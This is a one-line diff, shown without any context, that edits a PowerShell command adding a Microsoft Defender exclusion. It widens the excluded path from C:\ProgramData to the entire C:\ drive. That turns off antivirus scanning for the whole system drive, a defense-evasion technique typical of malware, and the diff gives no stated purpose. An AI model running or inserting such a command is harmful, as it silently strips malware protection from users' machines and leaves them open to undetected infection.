@@ -1,1 +1,1 @@
-powershell.exe -Command Add-MpPreference -ExclusionPath "C:\ProgramData"
+powershell.exe -Command Add-MpPreference -ExclusionPath "C:\"
